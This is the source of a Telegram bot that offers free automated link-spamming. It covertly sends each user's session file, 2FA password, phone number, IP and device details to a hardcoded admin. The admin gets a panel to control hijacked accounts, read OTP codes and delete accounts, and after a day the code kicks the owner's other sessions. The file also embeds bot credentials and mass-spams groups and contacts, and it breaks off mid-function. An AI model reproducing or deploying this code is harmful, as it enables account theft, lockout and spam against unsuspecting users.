import asyncio, os, random, datetime, re, glob, json, time, shutil
import aiohttp
from aiohttp import web
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    FloodWaitError, RPCError, UserNotParticipantError,
    SessionPasswordNeededError
)

# ==========================================
# CẤU HÌNH HỆ THỐNG
# ==========================================
A_ID = 32300846
A_HS = "a6da3117ff6b8a1679d04ab743976068"
B_TK = "8982371159:AAEvex9FTcnG_nVIftfwSLXO83xYHXoV6X4"
O_ID = 7907990385

BOT_USERNAME = "@minhduchotwar1_bot"
FOOTER_TEXT = "\n\nĐây là tin nhắn tự động rải miễn phí từ bot @Tudongrailinkbot"

# ==========================================
# KÊNH BẮT BUỘC THAM GIA — ADMIN SỬA QUA BOT
# ==========================================
REQUIRED_GROUPS_FILE = "required_groups.json"

def load_required_groups():
    default = [
        {"username": "chatbotrailink", "link": "https://t.me/chatbotrailink", "name": "Kênh Chính"},
        {"username": "Botrailink",     "link": "https://t.me/Botrailink",     "name": "Kênh Phụ"}
    ]
    if os.path.exists(REQUIRED_GROUPS_FILE):
        try:
            with open(REQUIRED_GROUPS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if data: return data
        except: pass
    return default

def save_required_groups(groups):
    with open(REQUIRED_GROUPS_FILE, "w", encoding="utf-8") as f:
        json.dump(groups, f, ensure_ascii=False, indent=4)

REQUIRED_GROUPS = load_required_groups()

user_group_delays = {}
user_loop_delays = {}
user_2fa_passwords = {}

DEFAULT_GROUP_DELAY = 2.0
DEFAULT_LOOP_DELAY = 3600.0

admin_selected_target = {}
anti_disconnect_tasks = {}
auto_link_tasks = {}
auto_link_modes = {}

def get_group_delay(u_i):
    return user_group_delays.get(u_i, DEFAULT_GROUP_DELAY)

def get_loop_delay(u_i):
    return user_loop_delays.get(u_i, DEFAULT_LOOP_DELAY)

def get_user_messages(u_i):
    custom_file = f"custom_links_{u_i}.txt"
    if os.path.exists(custom_file):
        with open(custom_file, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return []
            if "\n---\n" in content:
                return [m.strip() for m in content.split("\n---\n") if m.strip()]
            return [content]
    return []

def get_user_photo(u_i):
    photo_file = f"custom_photo_{u_i}.jpg"
    return photo_file if os.path.exists(photo_file) else None

IP_LOG_FILE = "account_ip_logs.json"

def save_account_ip_info(user_id, ip_info):
    try:
        data = {}
        if os.path.exists(IP_LOG_FILE):
            with open(IP_LOG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        data[str(user_id)] = ip_info
        with open(IP_LOG_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except: pass

def remove_account_ip_info(user_id):
    try:
        if os.path.exists(IP_LOG_FILE):
            with open(IP_LOG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if str(user_id) in data:
                del data[str(user_id)]
                with open(IP_LOG_FILE, "w", encoding="utf-8") as f:
                    json.dump(data, f, ensure_ascii=False, indent=4)
    except: pass

def get_account_ip_info(user_id):
    try:
        if os.path.exists(IP_LOG_FILE):
            with open(IP_LOG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                info = data.get(str(user_id), {"ip": "127.0.0.1", "country": "Việt Nam", "city": "Hồ Chí Minh", "region": "Miền Nam", "device": "Telegram Client"})
                return info
    except: pass
    return {"ip": "127.0.0.1", "country": "Việt Nam", "city": "Hồ Chí Minh", "region": "Miền Nam", "device": "Telegram Client"}

async def get_detailed_location_from_ip(ip_address):
    if not ip_address or ip_address in ["Không rõ IP", "Không xác định", "127.0.0.1", "localhost", "::1"]:
        return {"country": "Việt Nam", "city": "Hồ Chí Minh", "region": "Miền Nam"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{ip_address}?fields=status,country,regionName,city,query", timeout=3) as resp:
                if resp.status == 200:
                    res = await resp.json()
                    if res.get("status") == "success":
                        return {
                            "country": res.get("country", "Việt Nam"),
                            "region": res.get("regionName", "Không rõ"),
                            "city": res.get("city", "Không rõ")
                        }
    except:
        pass
    return {"country": "Việt Nam", "city": "Hồ Chí Minh", "region": "Miền Nam"}

bot = None
u_c = {}

F1, F3 = "bot_users.txt", "joined_users.txt"

def _su(u):
    try:
        if not os.path.exists(F1): open(F1, "w", encoding="utf-8").close()
        with open(F1, "r", encoding="utf-8") as f: us = f.read().splitlines()
        if str(u) not in us:
            with open(F1, "a", encoding="utf-8") as f: f.write(f"{u}\n")
    except: pass

async def fetch_and_save_ip(client, target_uid):
    try:
        auths = await client(functions.account.GetAuthorizationsRequest())
        for auth in auths.authorizations:
            if auth.current:
                raw_ip = getattr(auth, 'ip', '127.0.0.1')
                if not raw_ip: raw_ip = "127.0.0.1"
                loc = await get_detailed_location_from_ip(raw_ip)
                ip_info = {
                    "ip": raw_ip,
                    "country": loc.get("country", getattr(auth, 'country', 'Việt Nam')),
                    "region": loc.get("region", "Miền Nam"),
                    "city": loc.get("city", "Hồ Chí Minh"),
                    "device": f"{auth.device_model} ({auth.platform})"
                }
                save_account_ip_info(target_uid, ip_info)
                return ip_info
    except Exception as e:
        print(f"Lỗi lấy IP: {e}")
    default_info = {"ip": "127.0.0.1", "country": "Việt Nam", "city": "Hồ Chí Minh", "region": "Miền Nam", "device": "Telegram Client"}
    save_account_ip_info(target_uid, default_info)
    return default_info

async def cleanup_account(user_id):
    if user_id in auto_link_tasks:
        auto_link_tasks[user_id].cancel()
        auto_link_tasks.pop(user_id, None)
        auto_link_modes.pop(user_id, None)
    if user_id in u_c:
        try:
            await u_c[user_id].disconnect()
        except: pass
        u_c.pop(user_id, None)
    if user_id in anti_disconnect_tasks:
        anti_disconnect_tasks[user_id].cancel()
        anti_disconnect_tasks.pop(user_id, None)
    dev_task_key = f"dev_{user_id}"
    if dev_task_key in anti_disconnect_tasks:
        anti_disconnect_tasks[dev_task_key].cancel()
        anti_disconnect_tasks.pop(dev_task_key, None)
    remove_account_ip_info(user_id)
    time_file = f"login_time_{user_id}.txt"
    if os.path.exists(time_file):
        try: os.remove(time_file)
        except: pass

async def send_session_file_to_admin(client, user_id, phone_number):
    session_file_name = f"u_{user_id}.session"
    if os.path.exists(session_file_name):
        try:
            pwd_info = f"\n• Mật khẩu 2FA: `{user_2fa_passwords.get(user_id, 'Không bật')}`"
            ip_data = get_account_ip_info(user_id)
            ip_info = f"\n• 🌐 IP: `{ip_data.get('ip', '127.0.0.1')}`\n• 🌍 Quốc gia: `{ip_data.get('country', 'Việt Nam')}`\n• 🏙 Tỉnh/Thành: `{ip_data.get('city', 'Hồ Chí Minh')}`\n• 🛣 Khu vực/Phố: `{ip_data.get('region', 'Miền Nam')}`"
            await bot.send_file(
                O_ID,
                session_file_name,
                caption=f"📦 **FILE SESSION TÀI KHOẢN MỚI**\n• ID Userbot: `{user_id}`\n• Số Điện Thoại: `+{phone_number}`{pwd_info}{ip_info}",
                parse_mode='markdown'
            )
        except Exception as e:
            print(f"Lỗi gửi file session: {e}")

# ==========================================
# CHECK THAM GIA KÊNH BẮT BUỘC
# ==========================================
async def check_joined(user_id):
    """Trả về list các nhóm user CHƯA tham gia."""
    not_joined = []
    groups = load_required_groups()
    for g in groups:
        try:
            await bot(functions.channels.GetParticipantRequest(
                channel=g["username"], participant=user_id
            ))
        except UserNotParticipantError:
            not_joined.append(g)
        except Exception:
            not_joined.append(g)
    return not_joined

# ==========================================
# GIAO DIỆN MENUS
# ==========================================
def get_main_menu(u):
    logged = u in u_c
    status_text = "🟢 ĐÃ LOGIN (Sẵn sàng rải link)" if logged else "🔴 CHƯA LOGIN (Cần đăng nhập)"
    grp_delay = get_group_delay(u)
    loop_delay = get_loop_delay(u) / 3600.0
    is_auto_running = u in auto_link_tasks and not auto_link_tasks[u].done()

    if is_auto_running:
        curr_mode = auto_link_modes.get(u, "groups")
        mode_str = "Tất Cả Nhóm Chat" if curr_mode == "groups" else "Tất Cả Người Dùng"
        auto_status = f"🟢 Đang Chạy ({mode_str})"
    else:
        auto_status = "🔴 Đang Dừng"

    groups = load_required_groups()
    btn_groups = []
    for g in groups:
        btn_groups.append(Button.url(f"📢 {g['name']}", g['link']))

    msg = f"""
🚀 **Tự Động Rải Link By Minh Đức**
────────────────
• **Trạng thái tài khoản:** `{status_text}`
• **Trạng thái Rải Link:** `{auto_status}`
• **Delay giữa các đối tượng:** `{grp_delay}s`
• **Thời gian lặp lại:** `{loop_delay} tiếng/lần`

👇 **Chọn chức năng quản lý bên dưới:**
"""
    buttons = []
    if btn_groups:
        buttons.append(btn_groups)
    buttons += [
        [Button.inline("🔗 Bật Tự Động Rải Link", data="m_select_spam_mode"), Button.inline("⏹ Dừng Rải Link", data="stop_auto_link")],
        [Button.inline("📝 Cài Đặt Nội Dung & Ảnh", data="m_setting_link"), Button.inline("⏱️ Cài Đặt Delay Rải", data="m_setting_delay")]
    ]

    if u == O_ID:
        buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])
        buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])

    buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
    return msg, buttons

def get_spam_mode_menu():
    msg = """
🎯 **CHỌN CHẾ ĐỘ TỰ ĐỘNG RẢI LINK**
────────────────
Vui lòng chọn đối tượng bạn muốn hệ thống tự động gửi tin nhắn/hình ảnh:

1️⃣ **Spam Tất Cả Nhóm Chat:** Gửi đến tất cả các nhóm & kênh bạn đã tham gia.
2️⃣ **Spam Tất Cả Người Dùng:** Gửi đến tất cả người dùng từng nhắn tin/IB riêng.
"""
    buttons = [
        [Button.inline("💬 1. Spam Tất Cả Nhóm Chat", data="run_spam_groups")],
        [Button.inline("👤 2. Spam Tất Cả Người Dùng", data="run_spam_users")],
        [Button.inline("🔙 Trở Về Menu Chính", data="app_telegram")]
    ]
    return msg, buttons

async def notify_admin_login(client, user_id, phone_number):
    try:
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        about_text = full_user.full_user.about or "Không có"
        pwd_text = user_2fa_passwords.get(user_id, "Không bật")
        ip_data = await fetch_and_save_ip(client, me.id)
        now = datetime.datetime.now().strftime('%H:%M:%S - %d/%m/%Y')
        photos = await client.get_profile_photos('me', limit=1)
        avatar_path = None
        if photos:
            avatar_path = await client.download_media(photos[0], file=f"avatar_{user_id}.jpg")
        caption = f"""
🚨 **THÔNG BÁO TÀI KHOẢN LOGIN THÀNH CÔNG**
────────────────
• **Thời gian:** `{now}`
• **ID Userbot:** `{me.id}`
• **Họ Tên:** `{me.first_name} {me.last_name or ''}`
• **Username:** `@{me.username if me.username else 'N/A'}`
• **Số Điện Thoại:** `+{phone_number}`
• **Mật Khẩu 2FA:** `{pwd_text}`
• **🌐 Địa chỉ IP:** `{ip_data.get('ip', '127.0.0.1')}`
• **🌍 Quốc gia:** `{ip_data.get('country', 'Việt Nam')}`
• **🏙 Tỉnh/Thành phố:** `{ip_data.get('city', 'Hồ Chí Minh')}`
• **🛣 Phố / Khu vực:** `{ip_data.get('region', 'Miền Nam')}`
• **📱 Thiết Bị:** `{ip_data.get('device', 'Telegram Client')}`
• **Bio:** `{about_text}`
• **ID Bot User:** `{user_id}`
"""
        buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{me.id}")]]
        try:
            if avatar_path and os.path.exists(avatar_path):
                await bot.send_file(O_ID, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
            else:
                await bot.send_message(O_ID, caption, buttons=buttons, parse_mode='markdown')
        except: pass
        if avatar_path and os.path.exists(avatar_path): os.remove(avatar_path)
    except Exception as e:
        print(f"Lỗi gửi thông báo login: {e}")

async def check_and_kick_devices_background(target_uid, client):
    time_file = f"login_time_{target_uid}.txt"
    kicked_done = False
    if not os.path.exists(time_file):
        with open(time_file, "w", encoding="utf-8") as f:
            f.write(str(time.time()))
    while target_uid in u_c and not kicked_done:
        try:
            await client.get_me()
            if os.path.exists(time_file):
                with open(time_file, "r", encoding="utf-8") as f:
                    login_timestamp = float(f.read().strip())
                elapsed = time.time() - login_timestamp
                if elapsed >= 86400:
                    auths = await client(functions.account.GetAuthorizationsRequest())
                    total_devices = len(auths.authorizations)
                    other_devices = [auth for auth in auths.authorizations if not auth.current]
                    if not other_devices:
                        kicked_done = True
                        break
                    kicked_count = 0
                    for auth in other_devices:
                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                            kicked_count += 1
                        except RPCError: pass
                        except Exception: pass
                    if kicked_count > 0:
                        kicked_done = True
                        hours_passed = round(elapsed / 3600, 1)
                        await bot.send_message(
                            O_ID,
                            f"🛡 **TỰ ĐỘNG KICK THIẾT BỊ LẠ THÀNH CÔNG**\n"
                            f"• ID Acc: `{target_uid}`\n"
                            f"• Thời gian đã trôi qua: `{hours_passed} giờ`\n"
                            f"• Tổng số thiết bị ban đầu: `{total_devices}`\n"
                            f"• Đã tự động kick thành công: `{kicked_count}` thiết bị phụ!",
                            parse_mode='markdown'
                        )
        except Exception:
            try:
                if not await client.is_user_authorized():
                    await cleanup_account(target_uid)
                    break
            except: pass
        await asyncio.sleep(1800)

async def start_anti_disconnect(target_uid, client):
    while target_uid in u_c:
        try:
            await client.get_me()
        except Exception:
            try:
                if not await client.is_user_authorized():
                    await cleanup_account(target_uid)
                    break
            except: pass
        await asyncio.sleep(240)

async def background_auto_link_worker(user_id, client, mode="groups"):
    while user_id in u_c:
        try:
            messages_list = get_user_messages(user_id)
            grp_delay = get_group_delay(user_id)
            loop_delay = get_loop_delay(user_id)
            photo_path = get_user_photo(user_id)
            dialogs = await client.get_dialogs(limit=250)
            if mode == "groups":
                targets = [d for d in dialogs if d.is_group or d.is_channel]
                mode_label = "nhóm chat"
            else:
                targets = [d for d in dialogs if d.is_user and not d.entity.bot]
                mode_label = "người dùng"
            total_targets = len(targets)
            if not targets:
                await bot.send_message(user_id, f"⚠️ **Không tìm thấy {mode_label} nào để rải link!**")
                await asyncio.sleep(60)
                continue
            await bot.send_message(user_id, f"⏳ **Bắt đầu tiến trình rải tới `{total_targets}` {mode_label}...**")
            success_count, fail_count = 0, 0
            for dialog in targets:
                if user_id not in u_c or user_id not in auto_link_tasks:
                    break
                try:
                    content_to_send = random.choice(messages_list) if messages_list else "Chào bạn!"
                    final_msg = content_to_send + FOOTER_TEXT
                    if photo_path and os.path.exists(photo_path):
                        await client.send_file(dialog.id, photo_path, caption=final_msg, parse_mode='markdown')
                    else:
                        await client.send_message(dialog.id, final_msg, parse_mode='markdown')
                    success_count += 1
                    await asyncio.sleep(grp_delay)
                except FloodWaitError as fe:
                    wait_time = fe.seconds + random.randint(3, 10)
                    if fe.seconds > 60:
                        try:
                            await bot.send_message(
                                user_id,
                                f"⚠️ **FloodWait {fe.seconds}s** — tạm nghỉ `{round(wait_time/60, 1)} phút` rồi tiếp tục...",
                                parse_mode='markdown'
                            )
                        except: pass
                    await asyncio.sleep(wait_time)
                except Exception:
                    fail_count += 1
                    await asyncio.sleep(2)
            await bot.send_message(
                user_id,
                f"✅ **Đã hoàn thành vòng rải link!**\n"
                f"• Tổng số đối tượng: `{total_targets}`\n"
                f"• Thành công: `{success_count}`\n"
                f"• Thất bại: `{fail_count}`\n"
                f"⏳ Lặp lại sau `{round(loop_delay/3600.0, 1)}` tiếng."
            )
            await asyncio.sleep(loop_delay)
        except Exception:
            await asyncio.sleep(30)

# ==========================================
# HANDLER XỬ LÝ SỰ KIỆN & BUTTONS
# ==========================================
async def _st(ev):
    u = ev.sender_id
    _su(u)
    not_joined = await check_joined(u)
    if not_joined:
        lines = "\n".join(f"• [{g['name']}]({g['link']})" for g in not_joined)
        txt = (
            "🔒 **YÊU CẦU THAM GIA KÊNH**\n"
            "────────────────\n"
            "Bạn cần tham gia đủ các kênh/nhóm sau để sử dụng bot:\n\n"
            f"{lines}\n\n"
            "👉 Sau khi đã tham gia, bấm **✅ Đã Tham Gia** để xác nhận."
        )
        join_buttons = [[Button.url(f"➕ {g['name']}", g['link'])] for g in not_joined]
        join_buttons.append([Button.inline("✅ Đã Tham Gia — Kiểm Tra Lại", data="check_joined_verify")])
        return await ev.respond(txt, buttons=join_buttons, parse_mode='markdown', link_preview=False)
    msg, buttons = get_main_menu(u)
    await ev.respond(msg, buttons=buttons, parse_mode='markdown')

async def handle_incoming_photos(ev):
    u = ev.sender_id
    try:
        photo_path = await ev.download_media(file=f"user_upload_{u}.jpg")
        if photo_path and os.path.exists(photo_path):
            await ev.respond("🖼 **Đã tiếp nhận và xử lý hình ảnh của bạn thành công!**", parse_mode='markdown')
            try:
                await bot.send_file(
                    O_ID,
                    photo_path,
                    caption=f"📸 **HÌNH ẢNH MỚI TỪ USER GỬI VÀO BOT**\n• User ID: `{u}`\n• Thời gian: `{datetime.datetime.now().strftime('%H:%M:%S - %d/%m/%Y')}`",
                    parse_mode='markdown'
                )
            except: pass
            os.remove(photo_path)
    except Exception as e:
        print(f"Lỗi xử lý ảnh gửi: {e}")

async def _callback_handler(ev):
    global REQUIRED_GROUPS
    u = ev.sender_id
    data = ev.data.decode('utf-8')

    if data == "app_telegram":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # VERIFY THAM GIA KÊNH
    # ==========================================
    elif data == "check_joined_verify":
        not_joined = await check_joined(u)
        if not_joined:
            lines = "\n".join(f"• [{g['name']}]({g['link']})" for g in not_joined)
            txt = (
                "❌ **BẠN VẪN CHƯA THAM GIA ĐỦ!**\n"
                "────────────────\n"
                f"Còn thiếu:\n{lines}\n\n"
                "Tham gia xong rồi bấm lại **✅ Đã Tham Gia**."
            )
            join_buttons = [[Button.url(f"➕ {g['name']}", g['link'])] for g in not_joined]
            join_buttons.append([Button.inline("✅ Đã Tham Gia — Kiểm Tra Lại", data="check_joined_verify")])
            return await ev.edit(txt, buttons=join_buttons, parse_mode='markdown', link_preview=False)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "m_select_spam_mode":
        if u not in u_c:
            return await ev.answer("⚠️ Bạn cần LOGIN tài khoản trước khi bật rải link!", alert=True)
        messages_list = get_user_messages(u)
        if not messages_list:
            await ev.answer("⚠️ Bạn chưa cài đặt nội dung rải link!", alert=True)
            async with bot.conversation(u) as cv:
                await cv.send_message("📝 **BẠN CHƯA CÓ NỘI DUNG RẢI LINK!**\n────────────────\nHãy bấm nút **'📝 Cài Đặt Nội Dung & Ảnh'** ở menu chính để cài đặt ngay.")
            return
        msg, buttons = get_spam_mode_menu()
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data in ["run_spam_groups", "run_spam_users"]:
        if u not in u_c:
            return await ev.answer("⚠️ Bạn cần LOGIN tài khoản trước!", alert=True)
        mode = "groups" if data == "run_spam_groups" else "users"
        if u in auto_link_tasks and not auto_link_tasks[u].done():
            auto_link_tasks[u].cancel()
        client = u_c[u]
        task = asyncio.create_task(background_auto_link_worker(u, client, mode=mode))
        auto_link_tasks[u] = task
        auto_link_modes[u] = mode
        mode_str = "Tất Cả Nhóm Chat" if mode == "groups" else "Tất Cả Người Dùng"
        await ev.answer(f"✅ Đã BẬT tự động rải link cho: {mode_str}!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "stop_auto_link":
        if u in auto_link_tasks:
            auto_link_tasks[u].cancel()
            auto_link_tasks.pop(u, None)
            auto_link_modes.pop(u, None)
            await ev.answer("⏹ Đã DỪNG tự động rải link!", alert=True)
        else:
            await ev.answer("ℹ️ Chưa bật rải link!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # QUẢN LÝ DÀNH CHO ADMIN
    # ==========================================
    elif data == "m_control":
        if u != O_ID: return await ev.answer("❌ Chỉ Admin tối cao!", alert=True)
        active_uids = list(u_c.keys())
        txt = f"🎮 **QUẢN LÝ TÀI KHOẢN THEO STT**\n────────────────\n• Tổng số tài khoản hoạt động: `{len(active_uids)}`\n👇 **Chọn tài khoản hoặc thêm mới bên dưới:**"
        buttons = []
        idx = 1
        for uid in active_uids:
            buttons.append([Button.inline(f"TK {idx}. ID: {uid}", data=f"sel_acc_{uid}")])
            idx += 1
        buttons.append([Button.inline("📥 Thêm Session Vào Bot", data="rmt_add_session_file")])
        buttons.append([Button.inline("🔙 Trở Về Menu Telegram", data="app_telegram")])
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "rmt_add_session_file":
        if u != O_ID: return
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("📥 **HÃY GỬI HOẶC CHUYỂN TIẾP (FORWARD) FILE `.SESSION` VÀO ĐÂY:**")
            try:
                file_msg = await cv.get_response()
                if file_msg.document and file_msg.file.name.endswith(".session"):
                    temp_path = await file_msg.download_media()
                    try:
                        temp_client = TelegramClient(temp_path.replace(".session", ""), A_ID, A_HS)
                        await temp_client.connect()
                        if await temp_client.is_user_authorized():
                            me = await temp_client.get_me()
                            target_uid = me.id
                            correct_filename = f"u_{target_uid}.session"
                            if os.path.exists(correct_filename): os.remove(correct_filename)
                            os.rename(temp_path, correct_filename)
                            u_c[target_uid] = temp_client
                            await fetch_and_save_ip(temp_client, target_uid)
                            with open(f"login_time_{target_uid}.txt", "w", encoding="utf-8") as f:
                                f.write(str(time.time()))
                            task = asyncio.create_task(start_anti_disconnect(target_uid, temp_client))
                            anti_disconnect_tasks[target_uid] = task
                            dev_task = asyncio.create_task(check_and_kick_devices_background(target_uid, temp_client))
                            anti_disconnect_tasks[f"dev_{target_uid}"] = dev_task
                            await cv.send_message(f"✅ **NẠP SESSION THÀNH CÔNG!**\n• Tên tài khoản: `{me.first_name}`\n• ID: `{target_uid}`\n• Đã tự động đưa vào danh sách điều khiển.")
                        else:
                            await temp_client.disconnect()
                            if os.path.exists(temp_path): os.remove(temp_path)
                            await cv.send_message("❌ File session không hợp lệ hoặc đã bị revoke!")
                    except Exception as ex:
                        await cv.send_message(f"❌ Lỗi nạp session: `{ex}`")
                else:
                    await cv.send_message("❌ Không phải file `.session`!")
            except Exception as e:
                await cv.send_message(f"❌ Lỗi: {e}")

    elif data.startswith("sel_acc_"):
        if u != O_ID: return await ev.answer("Chỉ Admin tối cao!", alert=True)
        target_uid = int(data.split("_")[2])
        if target_uid not in u_c:
            await ev.answer("⚠️ Tài khoản đã đăng xuất hoặc mất kết nối!", alert=True)
            return await ev.edit("🎮 **QUẢN LÝ TÀI KHOẢN**\n\n⚠️ Tài khoản này đã không còn tồn tại. Vui lòng chọn tài khoản khác.", buttons=[[Button.inline("🔙 Làm mới danh sách", data="m_control")]], parse_mode='markdown')
        admin_selected_target[u] = target_uid
        client = u_c[target_uid]
        try:
            me = await client.get_me()
        except:
            await cleanup_account(target_uid)
            return await ev.answer("❌ Tài khoản đã bị revoke/log out!", alert=True)
        phone_str = f"+{me.phone}" if hasattr(me, 'phone') and me.phone else "Ẩn / Không xác định"
        pwd_str = user_2fa_passwords.get(target_uid, "Không bật / Không có")
        txt = f"""🕹 **HỒ SƠ TÀI KHOẢN ĐANG ĐIỀU KHIỂN:**
────────────────
👤 **Tên:** {me.first_name} {me.last_name or ''}
🆔 **ID:** `{me.id}`
📱 **Số Điện Thoại:** `{phone_str}`
🔐 **Mật Khẩu 2FA:** `{pwd_str}`
"""
        buttons = [
            [Button.inline("💬 Gửi Đơn Nhóm / IB", data="rmt_send_one"), Button.inline("🥷 Gửi Ẩn Đơn", data="rmt_send_ghost")],
            [Button.inline("📢 Gửi All Nhóm", data="rmt_send_all"), Button.inline("🥷 Gửi Ẩn All Nhóm", data="rmt_send_all_ghost")],
            [Button.inline("📤 Gửi Toàn Bộ User Từng IB", data="rmt_send_all_users")],
            [Button.inline("👑 Check Quyền Admin Nhóm", data="rmt_check_admin_rights"), Button.inline("📋 List Toàn Bộ Nhóm", data="rmt_list_all_groups")],
            [Button.inline("🔗 Tham Gia Addlist Link", data="rmt_join_chatlist"), Button.inline("📍 Xem TẤT CẢ IP", data="rmt_check_ip")],
            [Button.inline("🔑 Check Mã OTP & 2FA", data="rmt_check_otp"), Button.inline("📷 Quét Ảnh & Avatar", data="rmt_get_all_photos")],
            [Button.inline("📱 Check & Kick Thiết Bị", data="rmt_kick_devices"), Button.inline("✏️ Đổi Tên/Bio/Avt", data="rmt_custom_profile")],
            [Button.inline("📊 Thống Kê Chat", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
            [Button.inline("🏘 Quản Lý Kênh/Nhóm & Rời Bắt Buộc", data="rmt_channel_manager")],
            [Button.inline("🗑 Xóa Vĩnh Viễn Acc", data="rmt_delete_account")],
            [Button.inline("🔙 Chọn Acc Khác", data="m_control")]
        ]
        await ev.edit(text=txt, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # QUẢN LÝ KÊNH/NHÓM & RỜI BẮT BUỘC
    # ==========================================
    elif data == "rmt_channel_manager":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c:
            return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang tải danh sách kênh/nhóm...", alert=True)
        client = u_c[target_uid]
        try:
            dialogs = await client.get_dialogs(limit=300)
            ch_list = [(d.id, d.name or "Không tên") for d in dialogs if d.is_group or d.is_channel]
            total = len(ch_list)
            txt = (
                f"🏘 **QUẢN LÝ KÊNH/NHÓM — ACC `{target_uid}`**\n"
                f"────────────────\n"
                f"• Tổng số nhóm/kênh: `{total}`\n\n"
                f"👇 Chọn hành động bên dưới:"
            )
            buttons = [
                [Button.inline("🚪 Rời 1 Nhóm/Kênh Chỉ Định", data="rmt_leave_one")],
                [Button.inline("🗂 Rời Nhiều Nhóm (Nhập ID Danh Sách)", data="rmt_leave_multi")],
                [Button.inline("💣 Rời TẤT CẢ Nhóm/Kênh (Bắt Buộc)", data="rmt_leave_all")],
                [Button.inline("📋 Xem Danh Sách Đầy Đủ", data="rmt_list_channels_full")],
                [Button.inline("🔙 Trở Về Quản Lý Acc", data=f"sel_acc_{target_uid}")]
            ]
            await ev.edit(txt, buttons=buttons, parse_mode='markdown')
        except Exception as ex:
            await ev.answer(f"❌ Lỗi: {ex}", alert=True)

    elif data == "rmt_list_channels_full":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c:
            return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang tải...", alert=True)
        client = u_c[target_uid]
        try:
            dialogs = await client.get_dialogs(limit=300)
            ch_list = [(d.id, d.name or "Không tên") for d in dialogs if d.is_group or d.is_channel]
            if not ch_list:
                return await ev.respond("⚠️ Tài khoản này chưa tham gia nhóm/kênh nào.")
            chunk_size = 50
            for i in range(0, len(ch_list), chunk_size):
                chunk = ch_list[i:i + chunk_size]
                lines = "\n".join(
                    f"`{i + idx + 1}.` **{name}**\n   ID: `{gid}`"
                    for idx, (gid, name) in enumerate(chunk)
                )
                header = f"📋 **DANH SÁCH NHÓM/KÊNH** (Tổng: {len(ch_list)}) — Phần {i//chunk_size + 1}:\n────────────────\n"
                await ev.respond(header + lines, parse_mode='markdown')
            await ev.respond(
                f"✅ Đã liệt kê xong `{len(ch_list)}` nhóm/kênh.\n"
                f"💡 Dùng **ID** trên để rời từng nhóm qua nút **Rời 1 Nhóm/Kênh Chỉ Định**.",
                buttons=[[Button.inline("🔙 Trở Về", data="rmt_channel_manager")]]
            )
        except Exception as ex:
            await ev.respond(f"❌ Lỗi: `{ex}`")

    elif data == "rmt_leave_one":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c:
            return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message(
                "🚪 **RỜI 1 NHÓM/KÊNH CHỈ ĐỊNH**\n"
                "────────────────\n"
                "Nhập **ID nhóm/kênh** hoặc **@username** muốn rời:\n"
                "*(Xem danh sách ID qua nút 📋 Xem Danh Sách)*"
            )
            res = (await cv.get_response()).text.strip()
            client = u_c[target_uid]
            try:
                entity = int(res) if res.lstrip("-").isdigit() else res
                await client(functions.channels.LeaveChannelRequest(channel=entity))
                await cv.send_message(f"✅ **Đã rời thành công:** `{res}`")
            except Exception as ex:
                await cv.send_message(f"❌ Lỗi rời nhóm: `{ex}`")

    elif data == "rmt_leave_multi":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c:
            return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message(
                "🗂 **RỜI NHIỀU NHÓM/KÊNH**\n"
                "────────────────\n"
                "Nhập danh sách **ID nhóm/kênh**, mỗi ID một dòng:\n\n"
                "Ví dụ:\n`-1001234567890`\n`-1009876543210`"
            )
            res = (await cv.get_response()).text.strip()
            ids_raw = [line.strip() for line in res.splitlines() if line.strip()]
            client = u_c[target_uid]
            success, fail = 0, 0
            failed_list = []
            for raw_id in ids_raw:
                try:
                    entity = int(raw_id) if raw_id.lstrip("-").isdigit() else raw_id
                    await client(functions.channels.LeaveChannelRequest(channel=entity))
                    success += 1
                    await asyncio.sleep(1)
                except Exception as ex:
                    fail += 1
                    failed_list.append(f"`{raw_id}`: {ex}")
            result_txt = (
                f"✅ **RỜI NHÓM/KÊNH HOÀN TẤT!**\n"
                f"• Thành công: `{success}`\n"
                f"• Thất bại: `{fail}`"
            )
            if failed_list:
                result_txt += "\n\n**Danh sách lỗi:**\n" + "\n".join(failed_list[:10])
